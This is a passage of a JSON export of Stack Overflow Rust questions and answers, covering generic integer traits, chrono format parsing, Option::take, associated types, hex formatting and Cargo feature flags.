<code>num</code> have attempted to explore the design space.</p>\n\n<p>So, yes, if you wish to handle multiple integrals in generic ways, you will have to either pull in external crates (such as <code>num</code>) or suffer some pain.</p>\n\n<p><strong>However, you can use simpler code.</strong></p>\n\n<p>First of all, defining a <code>struct</code> and <code>trait</code> as such is completely unnecessary. Rust has generic functions:</p>\n\n<pre><code>fn update&lt;T&gt;(table: &amp;[T], init: T, xs: &amp;[u8]) -&gt; T\nwhere\n    T: Copy + Shl&lt;u8, Output = T&gt; + Shr&lt;usize, Output = T&gt; + BitXor&lt;Output = T&gt; + ToPrimitive,\n{\n    xs.iter().fold(init, |acc, x| {\n        (acc &lt;&lt; 8)\n            ^ table[(ToPrimitive::to_u8(&amp;(n &gt;&gt; ((8 * size_of::&lt;T&gt;()) - 8))).unwrap() ^ x) as usize]\n    })\n}\n</code></pre>\n\n<p>Secondly, in the name of readability, I would encourage you NOT to use <code>ToPrimitive::to_u8</code> directly, as it really obscures the code here.</p>\n\n<p>If it's a one-off, then you may either define a variable or wrap its use into a function.</p>\n\n<pre><code>fn upper8&lt;T&gt;(n: T) -&gt; u8 {\n    ToPrimitive::to_u8(&amp;(n&gt;&gt; ((8 * size_of::&lt;T&gt;()) - 8))).unwrap()\n}\n</code></pre>\n\n<p>Otherwise, you can define your own \"byte selection\" trait. It takes a couple more lines right now, but makes it up with a clearer interface adapted to your domain.</p>\n\n<pre><code>trait SelectByte: Sized {\n    fn bytes(&amp;self) -&gt; usize { mem::size_of::&lt;Self&gt;() }\n    fn lower(&amp;self, n: usize) -&gt; u8;\n    fn upper(&amp;self, n: usize) -&gt; u8 { self.lower(self.bytes() - n - 1) }\n}\n\nimpl SelectByte for u16 {\n    fn lower(&amp;self, n: usize) -&gt; u8 {\n        assert!(n &lt;= 1);\n        ((*self &gt;&gt; (n * 8)) &amp; 255u16) as u8\n    }\n}\n\nimpl SelectByte for u32 {\n    fn lower(&amp;self, n: usize) -&gt; u8 {\n        assert!(n &lt;= 3);\n        ((*self &gt;&gt; (n * 8)) &amp; 255u32) as u8\n    }\n}\n</code></pre>\n\n<p><em>Note: you would implement it for <code>u8</code>, <code>u64</code> and <code>u128</code> if necessary.</em></p>\n\n<p>And this gives a simpler-looking result:</p>\n\n<pre><code>fn update&lt;T&gt;(table: &amp;[T], init: T, xs: &amp;[u8]) -&gt; T\nwhere\n    T: Copy + Shl&lt;u8, Output = T&gt; + BitXor&lt;Output = T&gt; + SelectByte,\n{\n    xs.iter().fold(init, |acc, x| {\n        (acc &lt;&lt; 8) ^ table[(acc.upper(0) ^ x) as usize]\n    })\n}\n</code></pre>\n\n<p>Finally, if you find yourself enumerating the same set of constraints over and over, feel free to define a new trait for it:</p>\n\n<pre><code>trait Numeric: Copy + Shl&lt;u8, Output = Self&gt; + BitXor&lt;Output = Self&gt; + SelectByte {}\n\nimpl&lt;T&gt; Numeric for T\n    where T: Copy + Shl&lt;u8, Output = T&gt; + BitXor&lt;Output = T&gt; + SelectByte\n{}\n</code></pre>\n\n<p>And then use your shortcut:</p>\n\n<pre><code>fn update&lt;T: Numeric&gt;(table: &amp;[T], init: T, xs: &amp;[u8]) -&gt; T {\n    xs.iter().fold(init, |acc, x| { (acc &lt;&lt; 8) ^ table[(acc.upper(0) ^ x) as usize] })\n}\n</code></pre>\n\n<p><em>Which by the way, is the whole idea of the <code>num</code> crate if I remember correctly.</em></p>\n\n<p>The one pain point you cannot abstract away is that Rust will not allow a literal to be \"painlessly\" convertible into an abstract <code>T</code>. You can use <code>num::FromPrimitive</code> for that, but... yes, it doesn't exactly feel great.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user8370684"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 712, "favorite_count": 0, "accepted_answer_id": 48976258, "answer_count": 1, "score": 1, "last_activity_date": 1519654909, "creation_date": 1519575739, "question_id": 48975698, "link": "https://stackoverflow.com/questions/48975698/is-there-a-simple-way-to-use-an-integral-generic-type-in-rust", "title": "Is there a simple way to use an integral generic type in Rust?", "body": "<p>I have a series of functions that are almost identical, differing only in type and a constant. For example:</p>\n\n<pre><code>fn update16(table: &amp;[u16], init: u16, xs: &amp;[u8]) -&gt; u16 {\n    xs.iter().fold(init, |acc, x| { (acc &lt;&lt; 8) ^ table[(((acc &gt;&gt; 8) as u8) ^ x) as usize] })\n}\n\nfn update32(table: &amp;[u32], init: u32, xs: &amp;[u8]) -&gt; u32 {\n    xs.iter().fold(init, |acc, x| { (acc &lt;&lt; 8) ^ table[(((acc &gt;&gt; 24) as u8) ^ x) as usize] })\n}\n</code></pre>\n\n<p>So I thought about making this function generic on the type:</p>\n\n<pre><code>trait Update&lt;T&gt; {\n    fn update(table: &amp;[T], init: T, xs: &amp;[u8]) -&gt; T;\n}\n</code></pre>\n\n<p>I eventually was able to implement this:</p>\n\n<pre><code>use std::ops::Shl;\nuse std::ops::Shr;\nuse std::ops::BitXor;\nuse std::mem::size_of;\n\nextern crate num;\nuse num::ToPrimitive;\n\nstruct Normal;\n\nimpl&lt;\n    T: Copy + Shl&lt;u8, Output = T&gt; + Shr&lt;usize, Output = T&gt; + BitXor&lt;Output = T&gt; + ToPrimitive,\n&gt; CrcUpdate&lt;T&gt; for Normal {\n    fn update(table: &amp;[T], init: T, xs: &amp;[u8]) -&gt; T {\n        xs.iter().fold(init, |acc, x| {\n            (acc &lt;&lt; 8) ^\n                table[(ToPrimitive::to_u8(&amp;(acc &gt;&gt; ((8 * size_of::&lt;T&gt;()) - 8))).unwrap() ^ x) as\n                          usize]\n        })\n    }\n}\n</code></pre>\n\n<p>It was significantly more complicated than I expected. I had to use a bunch of traits, define an empty struct, include an external crate and obscure the basic calculation somewhat. It certainly took many more lines than the original.</p>\n\n<p>Is this the right way in Rust to use generics for integers? Or am I missing a much simpler way to approach this? </p>\n"}, {"tags": ["rust", "rust-chrono"], "answers": [{"tags": [], "owner": {"reputation": 46065, "user_id": 234590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/463c0219a51a5d1fd08e1fa280811b57?s=128&d=identicon&r=PG", "display_name": "Francis Gagn&#233;", "link": "https://stackoverflow.com/users/234590/francis-gagn%c3%a9"}, "is_accepted": true, "score": 2, "last_activity_date": 1519575924, "creation_date": 1519575924, "answer_id": 48975736, "question_id": 48975507, "link": "https://stackoverflow.com/questions/48975507/how-to-transform-chronoformatstrftime-to-chronoformatitem-statically/48975736#48975736", "title": "How to transform `chrono::format::strftime` to `chrono::format::Item` statically?", "body": "<p><code>StrftimeItems</code> is an iterator, not an iterable container (like <code>Vec</code> is). When you advance an iterator, you can't rewind it. <code>parse</code> must receive an iterator by value, which means that you must take a <code>StrftimeItems</code> our of your vector (which means you can't reuse it afterwards) or clone the <code>StrftimeItems</code> stored in the vector. By cloning the <code>StrftimeItems</code>, you can produce a new iterator whose state is distinct from the original (i.e. advancing one doesn't advance the other).</p>\n\n<blockquote>\n  <p>I'd like to avoid parsing them during run time</p>\n</blockquote>\n\n<p>However, <code>StrftimeItems</code> doesn't let you achieve your goal, because <a href=\"https://docs.rs/chrono/0.4.0/src/chrono/format/strftime.rs.html#162-326\" rel=\"nofollow noreferrer\"><code>StrftimeItems</code> lazily parses the format string as the iterator advances</a>.</p>\n\n<p>Instead, I would suggest that you collect the results from that iterator to a  <code>Vec&lt;Item&lt;'static&gt;&gt;</code>.</p>\n\n<pre><code>#[macro_use]\nextern crate lazy_static;\nextern crate chrono;\nuse chrono::DateTime;\nuse chrono::offset::FixedOffset;\nuse chrono::format::{Item, Parsed, parse};\nuse chrono::format::strftime::StrftimeItems;\n\nstatic FORMATS : &amp;[&amp;'static str] = &amp;[\"%Y-%m-%dT%H:%M:%S\", \"%Y-%m-%dT%H:%M:%S%.f\"];\n\nlazy_static! {\n    static ref PARSED_FORMATS : Vec&lt;Vec&lt;Item&lt;'static&gt;&gt;&gt; = FORMATS\n        .iter()\n        .map(|format| StrftimeItems::new(format).collect())\n        .collect();\n}\n\nfn parse_datetime(s: &amp;str) -&gt; Option&lt;DateTime&lt;FixedOffset&gt;&gt; {\n    for format in PARSED_FORMATS.iter() {\n        let mut parsed = Parsed::new();\n        let dt = parse(&amp;mut parsed, &amp;s, format.iter().cloned())\n            .and_then(|_| parsed.to_datetime() );\n        if dt.is_ok() {\n            return dt.ok()\n        }\n    }\n    return None\n}\n</code></pre>\n\n<p>Now, when we call <code>parse</code>, we pass <code>format.iter().cloned()</code>. <code>format</code> is a <code>Vec&lt;Item&lt;'static&gt;&gt;</code>, <code>iter()</code> produces a fresh iterator over references to the <code>Item</code>s, and <code>cloned()</code> adapts the iterator so that each <code>Item</code> is returned by value (achieved by cloning them) rather than by reference (because <code>parse</code> expects an iterator over <code>Item</code> values, not <code>Item</code> references).</p>\n"}], "owner": {"reputation": 4768, "user_id": 787366, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/a49b6d8775416297257c4c4d36e39967?s=128&d=identicon&r=PG", "display_name": "Shmoopy", "link": "https://stackoverflow.com/users/787366/shmoopy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 303, "favorite_count": 0, "accepted_answer_id": 48975736, "answer_count": 1, "score": 3, "last_activity_date": 1521656497, "creation_date": 1519574615, "last_edit_date": 1521656497, "question_id": 48975507, "link": "https://stackoverflow.com/questions/48975507/how-to-transform-chronoformatstrftime-to-chronoformatitem-statically", "title": "How to transform `chrono::format::strftime` to `chrono::format::Item` statically?", "body": "<p>I have a static array of <code>chrono::format::strftime</code> formats that my application supports.\nI'd like to avoid parsing them during run time, so I defined a <code>lazy_static!</code> block that parses them to a collection of <code>chrono::format::Item</code>.</p>\n\n<p>However, when I try to iterate over the parsed collection, I'm getting an error:</p>\n\n<pre><code>the trait bound `&amp;chrono::format::StrftimeItems&lt;'_&gt;: std::iter::Iterator` is not satisfied\n</code></pre>\n\n<p>Here's a short reproduction:</p>\n\n<pre><code>#[macro_use]\nextern crate lazy_static;\nextern crate chrono;\nuse chrono::DateTime;\nuse chrono::offset::FixedOffset;\nuse chrono::format::{Parsed, parse};\nuse chrono::format::strftime::StrftimeItems;\n\nstatic FORMATS : &amp;[&amp;'static str] = &amp;[\"%Y-%m-%dT%H:%M:%S\", \"%Y-%m-%dT%H:%M:%S%.f\"];\n\nlazy_static! {\n    static ref PARSED_FORMATS : Vec&lt;StrftimeItems&lt;'static&gt;&gt; = FORMATS\n        .iter()\n        .map(|format| StrftimeItems::new(format))\n        .collect();\n}\n\nfn parse_datetime(s: &amp;str) -&gt; Option&lt;DateTime&lt;FixedOffset&gt;&gt; {\n    for format in PARSED_FORMATS.iter() {\n        let mut parsed = Parsed::new();\n        let dt = parse(&amp;mut parsed, &amp;s, format)\n            .and_then(|_| parsed.to_datetime() );\n        if dt.is_ok() {\n            return dt.ok()\n        }\n    }\n    return None\n}\n</code></pre>\n\n<p>Attempting to de-reference <code>format</code> in the loop gives this error:</p>\n\n<pre><code>error[E0507]: cannot move out of borrowed content\n  --&gt; src\\main.rs:21:35\n   |\n21 |         let dt = parse(&amp;mut parsed, &amp;s, *format)\n   |                                         ^^^^^^^ cannot move out of borrowed content\n\nerror: aborting due to previous error\n</code></pre>\n\n<p>Attempting to clone <code>format</code> seems to work, however cloning seems redundant here and I'd like to avoid it.</p>\n\n<p>Is this the right approach here? or perhaps using a macro is better option?</p>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 20746, "user_id": 1233251, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cI9GF.png?s=128&g=1", "display_name": "E_net4 says don&#39;t copy that", "link": "https://stackoverflow.com/users/1233251/e-net4-says-dont-copy-that"}, "edited": false, "score": 7, "creation_date": 1519558806, "post_id": 48972898, "comment_id": 84950947, "body": "<a href=\"https://doc.rust-lang.org/std/option/enum.Option.html#method.take\" rel=\"nofollow noreferrer\"><code>Option.take</code></a>?"}], "answers": [{"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user7383906"}, "is_accepted": false, "score": 1, "last_activity_date": 1519563485, "creation_date": 1519563485, "answer_id": 48973685, "question_id": 48972898, "link": "https://stackoverflow.com/questions/48972898/how-do-i-move-an-option-from-one-structure-field-to-another-keeping-both-struct/48973685#48973685", "title": "How do I move an Option from one structure field to another, keeping both structures?", "body": "<p>Thanks to <a href=\"https://stackoverflow.com/users/1233251/e-net4\">E_net4</a> I found an easy way of doing it :</p>\n\n<pre><code>pub fn child(&amp;mut self, value2: i32) -&gt; MyStruct {\n    MyStruct {\n        value1: self.value1.take(),\n        value2: value2,\n    }\n}\n</code></pre>\n\n<p>Here, <code>value1: self.value1.take()</code> moves the value1 content from <code>self</code> to the new structure, leaving <code>None</code> in <code>self.value1</code>.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user7383906"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 135, "favorite_count": 0, "closed_date": 1535327499, "answer_count": 1, "score": 1, "last_activity_date": 1535327647, "creation_date": 1519558130, "last_edit_date": 1535327647, "question_id": 48972898, "link": "https://stackoverflow.com/questions/48972898/how-do-i-move-an-option-from-one-structure-field-to-another-keeping-both-struct", "closed_reason": "Duplicate", "title": "How do I move an Option from one structure field to another, keeping both structures?", "body": "<p>I would like to move the value of one struct's field to another struct like this:</p>\n\n<pre><code>struct MyStruct {\n    value1: Option&lt;Vec&lt;usize&gt;&gt;,\n    value2: i32,\n    // ...,\n}\n\nimpl MyStruct {\n    pub fn child(&amp;mut self, value2: i32) -&gt; MyStruct {\n        let mut value1 = self.value1.unwrap();\n\n        // Do some stuff..\n\n        MyStruct {\n            value1: Some(value1),\n            value2: value2,\n        }\n    }\n}\n\nfn main() {\n    let mut first = MyStruct {\n        // Building the first structure\n        value1: Some((0..10).map(|_| 0).collect()),\n        value2: 0,\n    };\n\n    // Using it\n\n    let second = first.child(1);\n}\n</code></pre>\n\n<p>I get an error:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error[E0507]: cannot move out of borrowed content\n --&gt; src/main.rs:9:26\n  |\n9 |         let mut value1 = self.value1.unwrap();\n  |                          ^^^^ cannot move out of borrowed content\n</code></pre>\n\n<p>How can I tell Rust to move <code>value1</code> from the first instance to the second, leaving <code>value1</code> of first equal to <code>None</code>?</p>\n\n<p>Later in my code I need to go back to potentially all the instances I used, reading other values but not the vector.</p>\n\n<p>I used to do a copy of the field but since I'm exploring a graph that is really huge, memory can't take it and it's not very efficient.</p>\n"}, {"tags": ["rust"], "answers": [{"tags": [], "owner": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "is_accepted": true, "score": 5, "last_activity_date": 1519570737, "last_edit_date": 1519570737, "creation_date": 1519561917, "answer_id": 48973446, "question_id": 48972685, "link": "https://stackoverflow.com/questions/48972685/extracting-an-associated-type-from-a-specific-implementation/48973446#48973446", "title": "Extracting an associated type from a specific implementation", "body": "<p>Like so:</p>\n\n<pre><code>impl std::str::FromStr for MyInt {\n    type Err = &lt;i32 as std::str::FromStr&gt;::Err;\n    fn from_str(src: &amp;str) -&gt; Result&lt;Self, Self::Err&gt; {\n        return Ok(MyInt(i32::from_str(src)?))\n    }\n}\n</code></pre>\n\n<p>The <code>&lt;Type as Trait&gt;</code> syntax effectively lets you specify associated items (<em>e.g.</em> types and functions) from a specific type's <code>impl</code> of a trait. That means you can also write <code>i32::from_str</code> as <code>&lt;i32 as std::str::FromStr&gt;::from_str</code>, which might be preferable in the context of a custom derive to avoid ambiguities in case another <code>from_str</code> is in scope. For trait methods, you can also write just <code>FromStr::from_str</code> and let the compiler infer the <code>Self</code> type.</p>\n"}], "owner": {"reputation": 2159, "user_id": 2570866, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/719063be2f6f7ca6be51df7833a26c25?s=128&d=identicon&r=PG", "display_name": "JelteF", "link": "https://stackoverflow.com/users/2570866/jeltef"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 34, "favorite_count": 0, "accepted_answer_id": 48973446, "answer_count": 1, "score": 3, "last_activity_date": 1519570737, "creation_date": 1519556444, "question_id": 48972685, "link": "https://stackoverflow.com/questions/48972685/extracting-an-associated-type-from-a-specific-implementation", "title": "Extracting an associated type from a specific implementation", "body": "<p>I want to create an implementation for <code>FromStr</code> that forwards to a subtype. Right now I have this <a href=\"https://play.rust-lang.org/?gist=a3f2f2b7e876d1f636aeeb7d2a1fa383&amp;version=stable\" rel=\"nofollow noreferrer\">playground</a>:</p>\n\n<pre><code>struct MyInt(i32);\n\nimpl std::str::FromStr for MyInt {\n    type Err = std::num::ParseIntError;\n    fn from_str(src: &amp;str) -&gt; Result&lt;Self, Self::Err&gt; {\n        return Ok(MyInt(i32::from_str(src)?))\n    }\n}\n</code></pre>\n\n<p>But I want to specify the associated <code>Err</code> type in terms of the implementation by <code>i32</code>. I need this because I actually want to generate this code with a custom <code>derive</code>. So I can't go and look it up manually. </p>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 20746, "user_id": 1233251, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cI9GF.png?s=128&g=1", "display_name": "E_net4 says don&#39;t copy that", "link": "https://stackoverflow.com/users/1233251/e-net4-says-dont-copy-that"}, "edited": false, "score": 2, "creation_date": 1519558059, "post_id": 48972370, "comment_id": 84950744, "body": "Your second question is a duplicate of <a href=\"https://stackoverflow.com/q/44711012/1233251\">this one</a>"}, {"owner": {"reputation": 46065, "user_id": 234590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/463c0219a51a5d1fd08e1fa280811b57?s=128&d=identicon&r=PG", "display_name": "Francis Gagn&#233;", "link": "https://stackoverflow.com/users/234590/francis-gagn%c3%a9"}, "edited": false, "score": 1, "creation_date": 1519567561, "post_id": 48972370, "comment_id": 84953512, "body": "Actually, the first <code>println!</code> prints ` 0x1` (with a leading space) and the second one prints <code>0x01</code>. You just have to consider that the <code>0x</code> is counted in the requested length. <code>println!(&quot;{:#06x}&quot;, 0x0001 as u16);</code> will print <code>0x0001</code>."}], "answers": [{"tags": [], "owner": {"reputation": 6357, "user_id": 6086311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb99289473f6393b89474785f2d294d1?s=128&d=identicon&r=PG", "display_name": "dtolnay", "link": "https://stackoverflow.com/users/6086311/dtolnay"}, "is_accepted": true, "score": 11, "last_activity_date": 1519655100, "last_edit_date": 1519655100, "creation_date": 1519580779, "answer_id": 48976519, "question_id": 48972370, "link": "https://stackoverflow.com/questions/48972370/hexadecimal-formatting-with-padded-zeroes/48976519#48976519", "title": "Hexadecimal formatting with padded zeroes", "body": "<p>Keep in mind that the leading <code>0x</code> is counted in the length so if you want something printed as <code>0x0001</code> then the length is really going to be 6, not 4.</p>\n\n<pre><code>fn main() {\n    println!(\"{:#06x}\", 0x0001u16);\n}\n</code></pre>\n\n<p>This prints <code>0x0001</code> as you wanted.</p>\n"}], "owner": {"reputation": 1102, "user_id": 920407, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/LvRhS.png?s=128&g=1", "display_name": "carlossless", "link": "https://stackoverflow.com/users/920407/carlossless"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1749, "favorite_count": 0, "accepted_answer_id": 48976519, "answer_count": 1, "score": 4, "last_activity_date": 1576413346, "creation_date": 1519553663, "last_edit_date": 1576413346, "question_id": 48972370, "link": "https://stackoverflow.com/questions/48972370/hexadecimal-formatting-with-padded-zeroes", "title": "Hexadecimal formatting with padded zeroes", "body": "<p>When formatting integer types to hexadecimal strings, I cannot get it to pad the numbers with zeroes:</p>\n\n<pre><code>println!(\"{:#4x}\", 0x0001 as u16) // =&gt; \"0x1\", but expected \"0x0001\"\nprintln!(\"{:#02x}\", 0x0001 as u16) // =&gt; \"0x1\", same\n</code></pre>\n"}, {"tags": ["rust"], "answers": [{"tags": [], "owner": {"reputation": 6357, "user_id": 6086311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb99289473f6393b89474785f2d294d1?s=128&d=identicon&r=PG", "display_name": "dtolnay", "link": "https://stackoverflow.com/users/6086311/dtolnay"}, "is_accepted": true, "score": 8, "last_activity_date": 1519539504, "creation_date": 1519539504, "answer_id": 48970801, "question_id": 48970713, "link": "https://stackoverflow.com/questions/48970713/rust-is-not-honoring-a-custom-cfg-feature-flag-for-conditional-compilation/48970801#48970801", "title": "Rust is not honoring a custom cfg feature flag for conditional compilation", "body": "<p>The syntax for conditional compilation based on Cargo features is like this:</p>\n\n<pre><code>#[cfg(feature = \"...\")]\n/* ... */\n\n#[cfg(not(feature = \"...\"))]\n/* ... */\n</code></pre>\n\n<p>In your case that would be <code>#[cfg(feature = \"ffiv1\")]</code>. The <code>#[cfg(ffiv1)]</code> also means something but is controlled by a different rustc flag than what Cargo uses for optional features.</p>\n"}], "owner": {"reputation": 6509, "user_id": 356011, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/d17ff41be1044be6fb5ef186b83efb20?s=128&d=identicon&r=PG", "display_name": "marathon", "link": "https://stackoverflow.com/users/356011/marathon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1126, "favorite_count": 0, "closed_date": 1519650286, "accepted_answer_id": 48970801, "answer_count": 1, "score": 2, "last_activity_date": 1519539504, "creation_date": 1519538672, "question_id": 48970713, "link": "https://stackoverflow.com/questions/48970713/rust-is-not-honoring-a-custom-cfg-feature-flag-for-conditional-compilation", "closed_reason": "Duplicate", "title": "Rust is not honoring a custom cfg feature flag for conditional compilation", "body": "<p>I'm trying to use rust's conditional compilation feature and it is not working at all.   I'm attempting to use this to toggle between a default library and a different one, using the <code>cfg</code> to re-export one of two different submodules depending on if the feature flag is set or not.   The code:</p>\n\n<p>lib.rs:</p>\n\n<pre><code>pub mod ffi;\n#[cfg(ffiv1)]\nmod ffiv1;\n#[cfg(not(ffiv1))]\nmod ffiv2;\n\n#[test]\nfn test_ffi_struct() {\n    let _fs = ffi::FFIStruct{ x: 42};\n}\n\n\n#[cfg(ffiv1)]\n#[test]\nfn test_v1() {\n    println!(\"v1 enabled\");\n}\n</code></pre>\n\n<p>ffi.rs:</p>\n\n<pre><code>//re-export as ffi::FFIStruct\n#[cfg(ffiv1)]\npub use ffiv1::FFIStruct;\n\n#[cfg(not(ffiv1))]\npub use ffiv2::FFIStruct;\n</code></pre>\n\n<p>ffiv1.rs:</p>\n\n<pre><code>pub struct FFIStruct {\n    pub x: i32,\n    y: IShouldFail\n}\n</code></pre>\n\n<p>ffiv2.rs:</p>\n\n<pre><code>pub struct FFIStruct {\n   pub x: i64\n}\n</code></pre>\n\n<p>Cargo.toml:</p>\n\n<pre><code>[features]\nffiv1 = []\n</code></pre>\n\n<p>With the default <code>cargo build</code>/<code>test</code>, this builds and works as expected, everything is ok.</p>\n\n<p>With <code>cargo build  --features ffiv1</code>, it behaves as no feature flags were passed at all.   Running <code>cargo</code> with --verbose shows <code>--cfg 'feature=\"ffiv1\"'</code> going to <code>rustc</code>.</p>\n\n<p>I would expect the compilation to fail on the undefined symbol <code>IShouldFail</code> in ffiv1.rs.  (and the extra test to run if it compiled).</p>\n\n<p>What is wrong here?</p>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 17608, "user_id": 3650362, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Fqdi1.jpg?s=128&g=1", "display_name": "trentcl", "link": "https://stackoverflow.com/users/3650362/trentcl"}, "edited": false, "score": 0, "creation_date": 1519563329, "post_id": 48970275, "comment_id": 84952167, "body": "You should perhaps consider implementing <code>FromIterator</code> as well, or instead."}], "answers": [{"tags": [], "owner": {"reputation": 6357, "user_id": 6086311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb99289473f6393b89474785f2d294d1?s=128&d=identicon&r=PG", "display_name": "dtolnay", "link": "https://stackoverflow.com/users/6086311/dtolnay"}, "is_accepted": true, "score": 0, "last_activity_date": 1519544984, "creation_date": 1519544984, "answer_id": 48971384, "question_id": 48970275, "link": "https://stackoverflow.com/questions/48970275/auto-coerce-string-to-str/48971384#48971384", "title": "Auto coerce &amp;String to &amp;str", "body": "<p>I don't think this is going to work using <code>AsRef</code> because the same type is free to implement both <code>AsRef&lt;[(&amp;str, &amp;str)]&gt;</code> and <code>AsRef&lt;[(&amp;str, &amp;String)]&gt;</code>, which would be ambiguous in any way that you would use <code>AsRef</code>.</p>\n\n<p>You can instead directly implement <code>From</code> for those types that you want to support, such as various sizes of arrays.</p>\n\n<pre><code>use std::collections::HashMap;\n\n#[derive(Debug)]\npub struct Attributes&lt;'a&gt;(HashMap&lt;&amp;'static str, &amp;'a str&gt;);\n\nmacro_rules! array_impls {\n    ($($N:expr)+) =&gt; {\n        $(\n            impl&lt;'a&gt; From&lt;[(&amp;'static str, &amp;'a str); $N]&gt; for Attributes&lt;'a&gt; {\n                fn from(array: [(&amp;'static str, &amp;'a str); $N]) -&gt; Self {\n                    Attributes(array.iter().cloned().collect())\n                }\n            }\n\n            impl&lt;'a&gt; From&lt;[(&amp;'static str, &amp;'a String); $N]&gt; for Attributes&lt;'a&gt; {\n                fn from(array: [(&amp;'static str, &amp;'a String); $N]) -&gt; Self {\n                    Attributes(array.iter().map(|&amp;(k, v)| (k, v.as_ref())).collect())\n                }\n            }\n        )*\n    }\n}\n\narray_impls! {\n     0  1  2  3  4  5  6  7  8  9\n    10 11 12 13 14 15 16 17 18 19\n    20 21 22 23 24 25 26 27 28 29\n    30 31 32\n}\n\nfn main() {\n    let fruit = \"banana\".to_string();\n\n    // From&lt;[(&amp;str, &amp;str); 2]&gt;\n    let attr: Attributes = [(\"fruit\", \"apple\"), (\"new_fruit\", &amp;fruit)].into();\n    println!(\"{:?}\", attr);\n\n    // From&lt;[(&amp;str, &amp;String); 1]&gt;\n    let another: Attributes = [(\"fruit\", &amp;fruit)].into();\n    println!(\"{:?}\", another);\n}\n</code></pre>\n"}], "owner": {"reputation": 499, "user_id": 8550523, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/6UROd.jpg?s=128&g=1", "display_name": "pepsighan", "link": "https://stackoverflow.com/users/8550523/pepsighan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 153, "favorite_count": 0, "accepted_answer_id": 48971384, "answer_count": 1, "score": 1, "last_activity_date": 1519544984, "creation_date": 1519533611, "question_id": 48970275, "link": "https://stackoverflow.com/questions/48970275/auto-coerce-string-to-str", "title": "Auto coerce &amp;String to &amp;str", "body": "<p>I am trying to convert a list of pair of string references to Attributes. It works for <code>&amp;str</code> or <code>&amp;str</code> followed by <code>&amp;String</code> (which is <code>Deref</code>ed to &amp;str) or <code>String.as_ref()</code>. But when the first argument is of type <code>&amp;String</code>, compiler errors out with:</p>\n\n<p><code>the trait std::convert::AsRef&lt;[(&amp;'static str, &amp;str)]&gt; is not implemented for [(&amp;str, &amp;std::string::String); 1]</code> </p>\n\n<p>How to allow <code>&amp;String</code> to coerce to <code>&amp;str</code> as the first argument?</p>\n\n<pre><code>use std::collections::HashMap;\n\n#[derive(Debug)]\npub struct Attributes&lt;'a&gt;(HashMap&lt;&amp;'static str, &amp;'a str&gt;);\n\nimpl&lt;'a, T&gt; From&lt;T&gt; for Attributes&lt;'a&gt;\nwhere\n    T: AsRef&lt;[(&amp;'static str, &amp;'a str)]&gt;,\n{\n    fn from(item: T) -&gt; Self {\n        Attributes(item.as_ref().into_iter().map(|&amp;(k, v)| (k, v)).collect())\n    }\n}\n\nfn main() {\n    let fruit = \"banana\".to_string();\n    let attr: Attributes = [(\"fruit\", \"apple\"), (\"new_fruit\", &amp;fruit)].into(); // This works. As it is coerced into &amp;str because of the first one.\n    let another: Attributes = [(\"fruit\", &amp;fruit)].into(); // Does not work as type is &amp;String. Help! Make it work.\n    let one_more: Attributes = [(\"fruit\", fruit.as_ref())].into(); // Works\n    println!(\"{:?}\", attr);\n    println!(\"{:?}\", another);\n    println!(\"{:?}\", one_more);\n}\n</code></pre>\n\n<p><a href=\"https://play.rust-lang.org/?gist=de04e150f7d1e1be86d14cd2dd79858d&amp;version=stable\" rel=\"nofollow noreferrer\">Link to Rust Playground</a></p>\n"}, {"tags": ["rust", "cross-compiling", "rust-cargo"], "comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519506376, "post_id": 48967583, "comment_id": 84940819, "body": "The <i>host</i> is what platform is performing the compilation; the <i>target</i> is what platform the code will be executed on. You use these terms interchangeably; which do you need?"}, {"owner": {"reputation": 90851, "user_id": 27009, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/f0a29af415477aa8c498a4f41ffe6640?s=128&d=identicon&r=PG", "display_name": "Kornel", "link": "https://stackoverflow.com/users/27009/kornel"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": 